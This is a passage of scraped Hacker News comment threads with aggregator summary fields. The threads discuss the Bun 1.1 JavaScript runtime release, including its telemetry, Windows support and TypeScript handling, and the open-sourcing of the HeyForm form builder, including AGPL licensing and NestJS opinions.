collected: https://github.com/oven-sh/bun/blob/801e475c72b3573a91e0fb4c... This 64 bit machine_id line is concerning: https://github.com/oven-sh/bun/blob/801e475c72b3573a91e0fb4c... It may be a unique identifier for your machine. reply Jarred 7 hours agorootparentThat is unrelated. This is a code signing / notarization issue because we don’t distribute Bun via the Mac App Store and likely the way it was installed was via npm or something other than .zip file we distribute. Code signing is necessary due to the JIT entitlement in Bun (otherwise Bun would be a whole lot slower) reply notelem 7 hours agorootparentMac code signing needs the machine id? https://github.com/oven-sh/bun/blob/801e475c72b3573a91e0fb4c... https://github.com/oven-sh/bun/blob/801e475c72b3573a91e0fb4c... Why then is the unique machine id collected on Linux? reply Jarred 7 hours agorootparentThis is dead code from before Bun 1.0. This code exists but is not run and probably stripped from the final executable (Zig is great at dead code elimination). We do get the Linux kernel version to detect if syscalls like pidfd_open are supported and enable fast paths. reply moritzwarhier 12 hours agoparentprev> I'd prefer if it was opt-in, and that users were given instructions for disabling it if they want to during installation. So you mean an informed opt-out, right? Thank you for the interesting hands-on experiences and insights regarding Bun. I followed the coverage and posts by Jarred here on HN for quite a while, think since the initial alpha release, but haven't used it. Will keep your examples for helpful added platform APIs in mind for when I hopefully come around to doing sth with Bun! It sounds like a great platform for JS scripting as well - I also think that could be a good and easy way to test the waters. Really, kudos to Bun and Jarred Sumner for living up to the promise he made when the first version was announced! reply gr4vityWall 11 hours agorootparent> So you mean an informed opt-out, right? I worded it wrong - I meant I'd prefer if it was opt-in, or at least informed opt-out, like you said. Thanks for pointing it out. :) > It sounds like a great platform for JS scripting as well - I also think that could be a good and easy way to test the waters. It is. Some other features you might enjoy are the built-in TypeScript support and test runner. It works well for one-off scripts too, if you'd prefer not using Bash. For me, it was refreshing coming from Node.js. Hope it is an enjoyable experience for you as well. reply preommr 8 hours agoprevHuge fan of Bun. Came for the ts interoperability, stayed for the performance. Also seems like the most sensible project in the space - I tried Deno and it was... rough. Bun on the otherhand was easy to intergrate and a very pleasant experience. reply woutr_be 6 hours agoparentI started using Bun by default for small personal projects. Having to set up Node, with Typescript and reloads always took the fun out of quickly prototyping something. Have yet to run Bun in production tho. reply dgellow 2 hours agoprevReally impressive list of changes. Bun sounds like the dream node alternative, I hope they succeed in their mission. And I’m glad they spent time on Windows support, that’s something neglected in the web development world reply madsbuch 2 hours agoparentI am curios, why do you think they did not succeed yet? reply dgellow 57 minutes agorootparentFrom their website: > The goal of Bun is to run most of the world's server-side JavaScript and provide tools to improve performance, reduce complexity, and multiply developer productivity. Bun is still pretty young and experimental, and not really production ready, though it’s getting there fast. If it grows enough to force node to improve, or if it takes over node, that would be a success based on their own goal reply WuxiFingerHold 1 hour agorootparentprevThere's been some polls on social media: Overall picture was 80-90% using Node. Then Bun, then Deno. I'd bet in the real world it's 99% Node for production. If in 3 years 5% were using Bun, it would be a great success (Node usage is huge). I think they're on track, but would not recommend Bun for production backends as of now. reply Jarred 17 hours agoprevI work on Bun and happy to answer any questions. Note that Bun v1.1 is still compiling at the time of writing (probably for another 20 minutes) reply toastal 17 hours agoparentNow that Discord will start showing ads, is there any chance Bun will support a communication platform that is open & ad-free like IRC, XMPP, or Matrix? reply Jarred 7 hours agorootparentShip an open-source Discord alternative that more people want to use than Discord and we’ll happily switch. reply dcgudeman 16 hours agorootparentprevWhat kind of question is this? He is working on a JavaScript/TypeScript runtime not building a communication product. Why would you run to him to solve your pet grievance with Discord? reply tbeseda 16 hours agorootparentI imagine the complaint is around Bun's use of Discord as community coordination tooling -- linked in the site's header. The post isn't implying Bun should be involved in the creation of an alternative. (I'm not here to throw shade at using Discord for OSS \"communities\" - I do as well - And am concerned about the path forward. Just want to clarify the question's intent.) reply toastal 15 hours agorootparentprevIf open source, free software is a good enough ethos for your code base, it should be good enough for your community communications. Supporting only a proprietary locks out a swath of users & Discord in particular is an information blackhole—and now with ads! reply fastball 8 hours agorootparentWhich users are unable to use Discord? Note that unable is different from unwilling, and \"locked out\" is not an accurate description of the latter. reply vladxyz 7 hours agorootparentMe! Discord does not consider me a real person if I don't have a phone number it approves of. reply toastal 5 hours agorootparentprevUsers that need special clients (accessibility, hardware, etc.). Users blocked by US sanctions. Users that have been moderated off the platform for something not in your community (account bans even happen accidentally). Users with privacy/anonymity concerns about the data collection (& now ads)—especially the chat rooms that require a SIM card. Users that take their FOSS or otherwise ethical software views or anti-corporate views to heart & want something built on those principle—from wanting to use free software to make free software, to wanting to outright avoid what some now call enshitification where a free (gratis) account clashes with the idea of freedoms, etc. reply scubbo 6 hours agorootparentprevI think they used the word \"support\" to mean \"use\", rather than \"build\". That is - they weren't asking Bun developers to _build_ an alternative to Discord, but rather to stop _using_ Discord. reply mdeeks 16 hours agorootparentprevI'm assuming it is because Bun uses Discord? There are Discord links on their site and on Github, though the links don't seem to work. reply WuxiFingerHold 1 hour agoparentprevYours and the team's performance is so impressive. I'm not brave enough to use Bun in production yet, but count me in in a year or so ... great stuff. reply gr4vityWall 17 hours agoparentprevIs there a privacy policy available for the telemetry collected by default by Bun? reply throwitaway1123 16 hours agorootparentThe opt-out telemetry is worrisome. Along with the fact that there doesn't appear to be a way to disable it for single-file executables if you plan to distribute a Bun cli app to users: https://github.com/oven-sh/bun/issues/8927 reply whstl 7 hours agorootparentAccording to this, it seems they don't actually send the telemetry: https://news.ycombinator.com/item?id=39901755 Hope my interpretation is correct. reply throwitaway1123 7 hours agorootparentYeah I saw a Github discussion where he mentioned that the code for uploading telemetry data was disabled, but he also said he plans to re-enable that at some point: https://github.com/oven-sh/bun/discussions/2605#discussionco... I would prefer to have the telemetry become opt-in before data collection is turned on. reply yolm 7 hours agoparentprevNot a question, but wanted to say: Great job! reply rcarmo 2 hours agoparentprevWhen are we getting UDP/dgram support? reply eddd-ddde 17 hours agoparentprevAre there plans for adding concurrent or parallel execution to the test runner? I recently tried looking at the code base to maybe implement it myself, and it looks like it wouldn't be easy without some reworks. reply Jarred 7 hours agorootparentWe need to do some form of this but I’m not exactly sure what yet. I suspect same process but multiple globals might work well. A lot of tests spend time sleeping or waiting for things. They might benefit from that kind of paralellism (like async/await, except between things it runs a whole other global object) Threads could also work but the problem is you have to re parse & evaluate all the code. That’s a lot of duplicate work. It’s probably still worth it for large enough apps reply eddd-ddde 4 hours agorootparentIsn't there some way of cloning a loaded vm after loading a module? I would imagine that should be possible some how, that way you could parse once then execute in multiple threads. reply cheema33 13 hours agoparentprev> I work on Bun and happy to answer any questions. I think I saw somewhere that 1.0 did not support NextJS. Does 1.1? reply cheema33 12 hours agorootparentI think I answered my own question. According to https://bun.sh/guides/ecosystem/nextjs Bun does not yet support NextJS. reply theThree 17 hours agoparentprevWhen will `worker` API be ready for production? reply fofolo 17 hours agoparentprevGG for Windows support and all the addition in 1.1 :) Thxx reply txdv 16 hours agoparentprevlove it, even `bun upgrade` is fast: On my rpi 4 that I capped to 600mhz for performance testing: Bun v1.1.0 is out! You're on 1.0.36 [3.93s] Upgraded. reply pritambarhate 16 hours agoprevWhat's the revenue model for Bun? What happens when the VC funding runs out? reply alberth 8 hours agoparentJavascript edge hosting. Bun team stated that here: https://news.ycombinator.com/item?id=35966373 reply eddd-ddde 14 hours agoparentprevI imagine some hosted service like everyone does is a likely option. reply marviel 14 hours agoparentprevI'm not sure why this is being downvoted -- it feels like a valid question for anything that enjoys wide adoption. reply fastball 8 hours agorootparentIt's a valid question, but does it matter for anyone except the dev team? Bun is open source, so VC-backing is mostly a helpful jumpstart. If they find a viable business model – great, development can be funded in perpetuity. If they don't, development was funded for a while by someone else's money and then Bun is just like any other open source project that lacks direct funding (most of them). reply marviel 7 hours agorootparentI suppose you're right -- the MIT model makes it a non-issue reply misiek08 1 hour agoprevSo able to optimize node.js and be $x times faster, but not able to calculate percentage of speedup correctly? 1.3s vs 2s it's not 58% speedup - it's 35%... Such approach makes those projects looks like unicorns, not production stuff - even they are. reply anonymoushn 1 hour agoparentUsing the numbers given, it's a 53% speedup. reply dgellow 43 minutes agoparentprevYou can communicate the same without the snarky tone reply yoavm 3 hours agoprevI just tried using Bun to run one of our more complex projects. Did the same with Deno a week ago and too many things weren't working. with Bun everything loaded perfectly, and I could immediately drop ts-node and nodemon because they're essentially redundant when using Bun. great stuff! reply fleetfox 3 hours agoprevFaster this, faster that. Is it finally segfault free? I've tried it like 3 times in span of last year with different projects only to find out it segfaults at runtime or when installing package. reply dimgl 2 hours agoparentSame. Tons of tooling breaks and segfaults. Our codebase has a dylib unknown symbol error that hasn't been fixed since before v1. reply QuinnyPig 3 hours agoparentprevBut look how quickly it segfaults! reply galaxyLogic 5 hours agoprevLooks like a great development. One thing I miss in Node.js is ability to run a HTTPS -server in a simple way without having to muddle with generating & installing a correct type of certificate. I understand there can be a \"self-signed certificate\" but there doesn't seem to be any npm-module I could install to take care of that. Since Bun is a \"server-side\" JavaScript platform it would be great if it could support https out of the box too. reply eddd-ddde 4 hours agoparentDoes this work? https://get.localhost.direct/ No need to mess with self signed certs, there are already some public 127.0.0.1 wildcard domains like the one I linked. reply pests 4 hours agoparentprevcaddy supports self signed certs by default https://caddyserver.com/docs/automatic-https reply francislavoie 3 hours agorootparentMore precisely, it runs its own local CA to issue certs for itself. Not exactly the same as self-signed certs (which is a cert whose key was used to sign itself), but better because leaf certs are short-lived and easily cycled. This allows for setting up trust easily, just need to trust the one root CA cert and every leaf cert for any domain served will be trusted. reply galaxyLogic 1 hour agorootparentprevDoes it work with Node.js or Bun or Deno? reply pests 1 minute agorootparentYou can proxy to internal services with a few lines of config. reply Aspos 5 hours agoparentprevCurious how do you actually see this working. Care to elaborate? reply modeless 13 hours agoprevHooray for Windows support! That was keeping me from using Bun since I'm on Windows a fair bit. My experience with Bun has been excellent so far and I'm looking forward to using it more. reply rcarmo 2 hours agoprevStill can’t use it without dgram support. But it’s nice to see it adding batteries. reply sharas- 24 minutes agoprevBun is run by a little prince reply __jonas 19 minutes agoparentcould you elaborate? reply pier25 8 hours agoprevIs Bun executing TS or is it also compiling down to JS and executing that? Edit: The docs mention: > Because Bun can directly execute TypeScript, you may not need to transpile your TypeScript to run in production. Bun internally transpiles every file it executes (both .js and .ts), so the additional overhead of directly executing your .ts/.tsx source files is negligible. https://bun.sh/docs/runtime/typescript The idea I'm getting from this is that both JS and TS are transpiled to something else. Are types preserved in this bytecode, AST, or whatever it is? reply emmanueloga_ 8 hours agoparent\"TypeScript & JSX support. You can directly execute .jsx, .ts, and .tsx files; Bun's transpiler converts these to vanilla JavaScript before execution.\" -- https://bun.sh/docs#design-goals reply vbezhenar 8 hours agoparentprevTranspiling TS is really easy task, because TS developers made huge effort to make it possible. You basically remove all types and that's about it. Probably could be done with simple character streaming algorithm. At this point, IMO, it should just be implemented within V8. Would make things much simpler for everyone. reply forty 2 hours agorootparentWhy would doing work at run time that can be done at build time be a good idea? I have a CI, I'd rather have it so the build work rather than delegating that to my production servers. reply forty 2 hours agorootparent(note that you still have to tsc everything anyway in the CI to check the types, so when you ship TS files to production your CI does the hard work, but then doesn't finish the easy part it so your prod server has to do it? Why?) reply whstl 7 hours agorootparentprevTotally agree. There is a TC39 proposal for that: https://github.com/tc39/proposal-type-annotations reply chuckadams 5 hours agorootparentprevIt's not just stripping types: enums have a runtime representation that needs to be generated. reply Kognito 8 hours agoparentprevIt’s not running TS directly, it’s just preconfigured to transpile TS to JS without the user having to bring extra tooling. Neat, but you’ll see the docs still recommend tsc for type checking at build. reply galaxyLogic 5 hours agorootparentI wonder what's the benefit of TS if there's no type-checking? If types are not checked that means the TS type-declarations could be totally wrong and nobody would know. In other words they could be misleading. Why incur the type-declaration overhead if they are not used after all? reply pfg_ 4 hours agorootparentThis is how typescript is run today. Typescript types never exist at runtime regardless of how typescript is run. There is no overhead defining types because they are deleted at runtime. The purpose of typescript is to make the editor experience better (autocomplete, error highlight). Typically typechecking is run in addition to tests to make sure there aren't a bunch of errors no one saw in editor. reply galaxyLogic 1 hour agorootparentSo \"type-checking is run\". Could it not be run by Bun automatically? reply crabmusket 6 hours agoparentprev> or is it also compiling down to JS and executing that? This is the only way to execute TypeScript. That's how every tool that \"executes\" TypeScript works. reply Jarred 7 hours agoparentprevBun transpiles Typescript to JavaScript before execution, removing types and doing some dead code elimination reply WuxiFingerHold 1 hour agoprevThe energy and velocity behind Bun is mind blowing. reply ericyd 7 hours agoprevNot sure I see the benefit of the bun shell. I use shell scripts when I know that the other people using the script will be able to run it in a similar shell to me, in order to cut down on dependencies. If I need it to be cross platform I just use a scripting language like JS. Bun shell keeps the more esoteric syntax of Unix-like shells but also requires a dependency (Bun itself). If you already have Bun installed why wouldn't you just write a JS script? reply zamadatix 6 hours agoparentI can definitely see the value of not wanting to write the boilerplate kind of stuff you need to do for more shell like scripting. I can also see wanting to emulate the traditional syntax while abstracting away whether you are on a Unix system and still allowing traditional JavaScript syntax in between the sheep-y parts. On the dependency side it'd be slick if you could bun --compile these like normal bun apps. reply pfg_ 4 hours agoparentprevIt's realy nice when I need to do shell stuff - much nicer to be able to use js to write a shell script than either go look up shell syntax again or use js with child_process.spawn() reply MarkSweep 5 hours agoprevI was quite curious about the .bunx file format. I think this could be a quite a useful thing, a universal binary format. Then I see the shim DLL: https://github.com/oven-sh/bun/blob/801e475c72b3573a91e0fb4c... Even before this past week's XZ backdoor revelation, checking binaries into source control rather than building from source seems quite questionable. In fairness to the Bun developer's, they have a comment in their build.zig file acknowledging that this shim should be built more normally rather than being checked in. Then I look into the source for it: https://github.com/oven-sh/bun/blob/801e475c72b3573a91e0fb4c... For no discernible reason, it is using a bunch of undocumented Windows APIs. The source cites this Zig issue as one reason for why they think it is OK to use undocumented APIs: https://github.com/ziglang/zig/issues/1840 I don't see any good reasons here cited for using undocumented, unstable interfaces. For Zig's part, there seems to be some poorly-explained interest in linking against \"lower level\" libraries without any motivating use case (just some hand waving about security and drivers, neither of which makes much sense. Onecore.lib is a thing if you wanted a documented way of linking an executable that run on a diverse set of Windows form factors. And compiling drivers may as well be treated as a seperate target, since function names are different). For Bun, I assume they are trying to have low binary size. But targeting NTDLL vs. Kernel32 should not make a big difference, especially when the shim is just doing basic file IO. For an example of making small executable with standard API, you can make hello world 4kb using MSVC just by using /NODEFAULTLIB and /ENTRY:main with link.exe and this program : #include#define MY_MSG \"Hello World!\" int main() { WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), MY_MSG, sizeof(MY_MSG), nullptr, nullptr); return 0; } So it should be possible to make a .bunx shim of small size without having to resort to undocumented API. (Current exe is 12kb). But even if the shim exe was 100kb, that would be still be an acceptable tradeoff for me than having to debug any problem that results from using non-standard APIs. reply nektro 4 hours agoparentthe motivation behind zig#1840 is that while the functions in ntdll aren't as well documented as the kernel32 functions, theyre not unstable and not having our binaries depend on kernel32.dll would lead to faster startup times as well as allow us to do things like use more performant algorithms for UTF-8UTF-16 conversion. on top of the things mentioned in the issue like having APIs with more powerful features. reply tjenkinsqs 13 hours agoprevWe've been using bun for a while now. We love the speed, but we love the integration even more. No need to use node, npm, nodemon, tsx, esbuild and jest. Bun is our one-stop-shop for Typescript. Thank you! reply fastball 8 hours agoparentCan I ask what you use it for specifically? reply ivanjermakov 7 hours agorootparentI use Bun as a test and dev build runner for TS programs. I still compile with tsc though. reply bluelightning2k 3 hours agoprevThis guy ships! reply blackhaj7 8 hours agoprev [–] Bun churning out the good stuff, yet again. So often I read the release notes and think “what a great idea, why wasn’t this already a thing” e.g. syntax highlighted errors reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Bun 1.1 is a robust toolkit for JavaScript and TypeScript applications, featuring over 1,700 commits enhancing stability and Node.js compatibility.",
      "The update brings Windows support, a faster package manager, optimized Node.js APIs, Web standard APIs support, and developer-centric improvements like syntax-highlighted errors.",
      "Users are advised to upgrade to Bun 1.1 to benefit from faster script running, platform enhancements, simplified stack traces, and new developer-friendly features."
    ],
    "commentSummary": [
      "Users are discussing the suitability of Bun and Deno as alternatives to Node.js for web server development, scripting, and small command-line interfaces, with a focus on TypeScript support, performance, and developer experience.",
      "Advantages of using Bun include faster TypeScript interoperability, quicker installations, and improved ES module support compared to Node.js and Deno, prompting comparisons with tools like Jest, Node.js, and npm.",
      "Conversations emphasize the potential benefits and challenges of integrating Bun and Deno into software development projects, raising concerns about compatibility, project longevity, telemetry collection, code signing, and undocumented Windows APIs."
    ],
    "points": 324,
    "commentCount": 189,
    "retryCount": 0,
    "time": 1711987881
  },
  {
    "id": 39895960,
    "title": "Introducing HeyForm: Open-Source Form Builder Empowering Users",
    "originLink": "https://github.com/heyform/heyform",
    "originBody": "HeyForm is an open-source form builder that allows anyone to create engaging conversational forms for surveys, questionnaires, quizzes, and polls. No coding skills required. WebsiteDocumentationBlogTwitter Features HeyForm simplifies the creation of conversational forms, making it accessible for anyone to gather information or feedback through engaging surveys, quizzes, and polls. We are committed to enhancing HeyForm with regular updates, including bug fixes, new features, and performance improvements. Build Forms with Ease 📝 Versatile Inputs: From basic text, email, and phone number fields to advanced options like picture choices, date pickers, and file uploads, HeyForm supports a wide array of input types. 🧠 Smart Logic: Conditional logic and URL redirections for dynamic, adaptable forms. 🔗 Powerful Integrations: Connect with webhooks, analytics, marketing platforms, and tools like Zapier and Make.com. Customize to Your Brand 🎨 Visual Themes: Tailor the look and feel of your forms to match your brand identity with customizable fonts, colors, backgrounds, and more. ✨ Advanced Theming: Gain greater control with extensive customization options, including custom CSS for deeper personalization. Analyze and Act on Data 📊 Insightful Analytics: Gain insights with detailed analytics, including drop-off rates and completion rates. 📤 Data Export: Easily export your form results to CSV for further analysis or integration into your systems. Getting started with HeyForm The simplest and most efficient way to dive into HeyForm is through our official hosted service. When you choose this cloud version, you're getting the advantage of high reliability, automatic backups, robust security, and hassle-free maintenance—all carefully managed by us, the passionate duo behind HeyForm. Choosing our hosted version not only saves a significant amount of time and resources but also supports HeyForm's development and the open-source community. Get a great service while backing innovation. 💙 Structure . └── packages ├── answer-utils (form submission utils for server and webapp) ├── shared-types-enums (shared types/enums for server and webapp) ├── utils (common utils for server and webapp) ├── server (node server) └── webapp (react webapp) Self-hosting Interested in self-hosting HeyForm on your server? Take a look at the self-hosting installation instructions. Local development Follow the local installation instructions to run the project locally. How to Contribute You are awesome, let's build great software together. Head over to the contribute docs to get started. 💪 Support & Community You'll find a lot of resources to help you get started with HeyForm in the help center. However, if you can't find what you're looking for there, don't hesitate to reach out to us: Have a question? Join the Discord server and get instant help. Found a bug? Create an issue License HeyForm is open-source under the GNU Affero General Public License v3.0 (AGPL-3.0), you will find more information about the license and how to comply with it here.",
    "commentLink": "https://news.ycombinator.com/item?id=39895960",
    "commentBody": "I just made my profitable online form builder open-sourced (github.com/heyform)317 points by dearroy 17 hours agohidepastfavorite91 comments jraph 14 hours agoI'm secretly and slowly building a form building application. The idea is that in my association we don't want to rely on Google Forms. And we only want to use open source software. We are using FramaForms which is a bit clunky and doesn't have this feature that updates a spreadsheet automatically. I thought that I could just create something that would answer both concerns. But a good open source forms app would probably change everything, I would gladly stop my small project (in favor of contributing to an existing one for instance). I see there is integration with a lot of products, including Google Drive and Google Sheet. Would an integration with Nextcloud be considered? Congratulations on open sourcing this, we need open source and self hosted form solutions. Critically private data is put in forms and that get sent to big private companies like Google, which is not ideal. As other commenters say, you might want to use AGPL indeed, but I guess you carefully thought this decision. reply dearroy 10 hours agoparentThank you for sharing your experience and insights. It would be fantastic if we could collaborate to make HeyForm better suited to your needs, as well as the needs of many others. > Would an integration with Nextcloud be considered? We are definitely interested in exploring this possibility. However, since I am not personally familiar with Nextcloud, it would be helpful if you could provide more details. Could you please open an issue so that we can discuss it further? reply jraph 3 hours agorootparentSure, I'll take the time. reply abdullahkhalids 12 hours agoparentprevGrist has the ability to create forms that are automatically connected to their spreadsheets [1]. Though it doesn't seem like you can create sophisticated forms (with some logic in them for example) just yet. I am thinking of moving my volunteer org away from Google forms towards Grist. [1] https://support.getgrist.com/widget-form/ reply effluvium 2 hours agorootparentFYSA https://github.com/department-of-veterans-affairs/LEAF reply blowski 13 hours agoparentprev> But a good open source forms app would probably change everything Can you go into that a bit more, I'm interested what you would see changing. Why do you think it hasn't been done already? reply krisoft 8 hours agorootparentMy understanding of the comment is that “changing everything” should be understood in the context described by the begining of the comment. That is their organisation would stop using FramaForms, and the commenter would stop working on their replacement skunk project. That is all of those mentioned plans/activities would change drastically. It wouldn’t change literally everything. The Sun and the Earth will continue to orbit around a shared barycenter. Humans will continue to breath oxygen. Carbon will continue to form four covalent bonds per atom. Some boys will continue to think a lot about some girls, etc etc. reply jraph 3 hours agorootparentYep, I meant this indeed. reply flavaz 12 hours agoparentprevLimesurvey is “good enough” for most applications and is open source- any reason why that wouldn’t work for your use case? reply jraph 3 hours agorootparentAs far as I know, LimeSurvey can't auto update a spreadsheet with the answers. But LimeSurvey has its advantages: - it's in PHP, and our whole infra is already using it (WordPress and Nextcloud). So it's easier to setup and if we want bridges between these tools, it'll be easier. - AFAIR, it doesn't require JS when filling a form and in particular, it's not a React app. We have used LimeSurvey in the past, we got rid of it but I don't remember why, I should look into it another time. Two other big requirements we have is solid conditional field support and easy to use form builder. reply flavaz 42 minutes agorootparentReason why I ask is that there are many form/survey builders out there, as people often underestimate the complexity it takes to set one up that supports things like max diff, routing etc. Looking at the forums I can see that some have managed to achieve what you need via plugins (albeit the one I see that is confirmed working seems to be paid…) Just thinking contributing an open source plugin to a great open source scripting tool would save you headaches down the road :) reply Syntaf 9 hours agoprevVery cool! Form builders are really fun applications to build and teach you a lot about more advanced relational models (like polymorphic relations) I scrapped together a form-builder-with-payments using RoR and RailsAdmin last year for my club and ended up spinning it off into a pay-per-use SaaS[1]. As it turns out, forms are a fundamental aspect of a LOT of things, and offering free use tools can change the game for clubs or organizations looking to keep their data in one place. [1] https://embolt.app reply mewpmewp2 9 hours agoparentWhat do you mean by club exactly? reply Syntaf 6 hours agorootparentI generally mean a member based organizations, could be a book club or professional association or anything of the sorts. Not every club charges dues, but those that do generally start off with a google form and a pinky promise that you'll send your dues after submitting the form. Works for awhile but it's hard to maintain, speaking as someone who's had to do this before. embolt is my go at offering a member platform with a very low (the lowest) barrier of entry to getting up and running with paid registrations forms & an admin dashboard. reply replwoacause 6 hours agorootparentLooks very well done! Did you have to write much JS or could you do everything you needed with RoR? reply snapcaster 16 hours agoprevHow did you think about the tradeoffs between closed-source profitable vs. open sourcing it? What do you see as your criteria for success on this move? reply tomfreemax 1 hour agoprevLooks really cool and could be a good alternative to Typeform. In our organization, due to privacy reasons we need to self host. You might want to look at something like the plus plan photoprism has. For photoprism, if you want a UI for user admin, you pay something. One can do the same thing from cli, but in corporate environments it's easier for me to say, look, we need to pay, because we need this admin interface. If I would self host but want to support you otherwise, it's hard to argue why the organization should \"donate\" money. Hope it makes sense. Best wishes! reply rkuodys 3 hours agoprevI cannot quickly find the answer so maybe the project owner can share - I have a need for which apparently there is no ready-to-use product - I need to have form which is anonymous, but at the same time it should be one-time-only submit. (Like voting system). My ideal solution would be to send unique link to each recipient and limit one submission per link. However, I as a purchaser should not be able to see who got which link, or at least, how each link voted. Question if heyform has some implementation of the need already, because none of the well known products - Google forms, MS Forms, Typeform - support anything like that reply thih9 3 hours agoparentI doubt any generic platform would support such a specific use case out of the box, especially if major providers don’t offer it. reply eastbound 3 hours agoparentprevEven if it were anonymous, your recipients wouldn’t trust it. Everyone knows anonymous polls get you fired (which is still proof that some people still trust anonymity, but those people are usually not working here anymore). reply snvzz 3 hours agoprevHuge Affero (AGPL) warning. Do not touch unless you understand how the license works and want to do so anyway. reply frabcus 3 hours agoparentI see this as huge Affero (AGPL) praise! It would be great if the license was used more. I'd much rather contribute to something where sharealike extends in some way across networks - software doesn't link in binaries, as the GPL does cover, as much these days. reply p_l 3 hours agorootparentGPL never talked about linking, it's probably the single most misunderstood aspect of GPL. You can in fact have GPL bw applied over network IPC even reply dgellow 3 hours agoparentprevSee their docs page here: https://docs.heyform.net/license reply thih9 3 hours agoparentprevCan you be more specific? In what ways exactly it is more dangerous than other open source licenses in this case? reply chii 3 hours agorootparent> more dangerous only if you intend to produce a derivative work for which you intend to sell, and thus do not want to reveal said derivative to others. AGPL is the best license available for open source imho. reply thih9 34 minutes agorootparentThat was my understanding too, I don’t understand how this would be seen as dangerous in this context, I’d also view it as a benefit. reply la64710 14 hours agoprevWhat is the reason for “open sourcing” this , when any meaningful implementation is locked away behind services and is closed source. I just think these kind of use cases confuses users. There is no problem in being closed source and proprietary (unless you are using preexisting open source code and open sourcing those parts of your code makes it legally compliant) . In any case it is confusing at best and misleading at the worst. reply cynicalsecurity 13 hours agoparentFree advertising on Haker News. 10 bucks net profit without any grows is also profitable. Getting to the main page of HN was worth open sourcing what had no potential anyway. This is my reasoning, I'm not the creator of this. reply winrid 3 hours agorootparentAs someone that built a 20m ARR survey product... The only difference between this and something making millions is a sales team. reply lelanthran 1 hour agorootparentprevI think maybe you're being overly cynical (yes yes, I did see your username!) Sometimes, large companies open-source a SaaS product because they expect to make more money from the free marketing (See yesterdays post about headline-driven development) even though their implementation remains closed. We still give them news-space, don't we? Why should we act any differently for solo developers? reply ricardonunez 9 hours agorootparentprevUsername checks out. reply jraph 5 hours agoparentprev> when any meaningful implementation is locked away behind services and is closed source. As someone seeking a purely open source forms solution, what do you mean by this? reply j45 4 hours agoparentprevThere are organizations (often not small) that will pay for a hosted and closed source solution if it is available under dual license in case it goes away. Other organizations still, have open source only policies, or no open source at all. Many of these applications can be in government. It can increase the footprint. reply izwasm 15 hours agoprevI really like that you are using nestjs, idk why some devs hate it, IMHO its the best node framework that can be used to build production ready apps, i started using it a month ago at work and it was my first time using it, and it already made so productive reply aswerty 13 hours agoparentI'm literally in the middle of spending my evening, outside of work, gutting NestJS from a project I've inherited at work. I would literally consider changing jobs if I couldn't remove it. There is so much to unpack to get as why I have such an issue with it. But time and again I have been frustrated with it in terms of: it's design philosophy, implementation, scope of what it covers, bloat, recommended implementation approaches, etc. I don't understand how a single framework can think that it should cover: message/request handling, logging, config management, dependency inversion, persistence, and IO. These things have almost no cross over (i.e. if they are well designed they should be easily composable with any other component) but time and again framework developers attempt to bundle them into a \"one size fits all solution\". To best sum it up. I think any package I use should be secondary to my application. But this package makes it so that my application is secondary to the framework. reply jzig 10 hours agorootparentDon’t .NET and Rails do all those things? reply NicoJuicy 8 hours agorootparentThey provide a default. I suppose in nextjs it's the only option? reply ganduG 6 hours agorootparentNah, you can swap out most things. reply _fat_santa 14 hours agoparentprevI recently migrated my API from lambda functions do a dockerized Node API and I evaluated NestJS, though ended up using Fastify. Like others have mentioned, it's great for devs that come from Angular or Java but for me I didn't like that it used decorators all over the place and preferred to have something more \"Express like\" reply calmoo 14 hours agoparentprevBest makes JavaScript look like Java, it’s needlessly complex and just encourages vast amounts of boilerplate. Awful stuff. reply eddd-ddde 13 hours agorootparentThis is precisely my experience. Classes are painful to deal with. Decorators are not only unergonomic, they also throw away any type safety. Also Nest shoves class transformer and class validator down your throat, which are also a pian in the ass. My go-to right now is itty router with zod. reply kwhitley 10 hours agorootparentLove to hear it! Btw, itty-router v5 just dropped a couple days ago, with a fun batteries-included (still ultra-small) router, that should make your code even leaner. How is the integration w/ zod anyway, and how can we make it better? reply eddd-ddde 8 hours agorootparentYes I noticed v5! I love it so much. The great thing about itty is you can integrate anything really easily. I'm in the progress of making a simple middleware based on zod to parse not only request body, but also params, headers, etc. Zod is really powerful and you could even use it to do stuff like parse jwt tokens and have complete type inference. Perhaps my only issue with this approach is that you rely on a wrapper function to correctly pass the generics fron the middleware to the main handler. Another possible approach is using types-per-route but then it's hard to enforce that the validator agrees with the handler itself. reply dns_snek 13 hours agorootparentprevSame experience here. Admittedly it's been a few years since I last used it, but there was so much boilerplate coupled with a layer of \"magic\" that was too thick for my liking. Provider initialization (dependency injection) failed on me on a few occasions and it always wasted hours of productivity. It would break in some obscure way that wouldn't log any errors to the console, so there was nothing to go on besides attaching a debugger and stepping through layers of framework code. It was quite infuriating because it always happened when I was in the middle of something else. If your specific use case wasn't covered by their docs (which were very barebones and \"hello-world\" oriented at the time), it was painful to figure out and use. reply mufeng 2 hours agoparentprevWhy not use NestJS, a framework that solves the engineering problems you encounter in other Node.js frameworks? reply pjerem 14 hours agoparentprevnestjs is nice if you’re coming from Angular. It’s basically Angular for the backend. But like Angular, there is a very wide range of use cases where it is totally overkill and like Angular, companies are throwing it at each and every project. I don’t find it bad but it’s in a strange spot being more bloated than other JS frameworks while still being way less \"batteries included\" than more classical corporate frameworks. Like Angular, I don’t hate it though it’s just that I still haven’t figured out a project where it’s better suited than something else. reply wouldbecouldbe 14 hours agoparentprevNestJS is nodeJS for Java people. It's like Angular in that sense. So some people will feel like it's over engineered. I mean it's overengineered. Why do I have to register all these things, and why does it keep crashing if I register it like this without any understandable error message. It has a little bit of an OCD relationship with dependency injection. Where the normal import system can handle most of those cases. But few nice things, resolvers, auto-generate swaggers. And TypeORM is lovely. But yeah it's a bit too demanding. I'm okay with an opiniated framework if it gives a lot of features out of the box (like laravel or NextJs), but NestJS tells me how to do things without giving me enough in return. (auth, sockets etc are still quite a lot of work) reply mewpmewp2 9 hours agorootparentYeah, I don't know, most of the time only time you actually need dep injection is for tests, and at that point why not just mock with Jest? Feels too much just having to do all this work just to complicate dependencies and make moving around more difficult for tests when a much simpler solution is available. reply wouldbecouldbe 12 minutes agorootparentDependency injection was not really meant to help with testing, but to keep code decoupled. It can be a nice pattern, but even if nestjs forces us to do it, we developers still find creative ways to nullify any attempts to decouple the code we write :). reply tisdadd 6 hours agorootparentprevJust wanted to chime in and say that if you use the CLI to generate things, the experience is much nicer. However, you do still need to be in their playground. If you have a large team out org and don't want to have to document extra about the guts, I love having something proven. If you need to mix protocols, I believe Feathers JS was a little simpler to get into last I looked. reply bieberChen 7 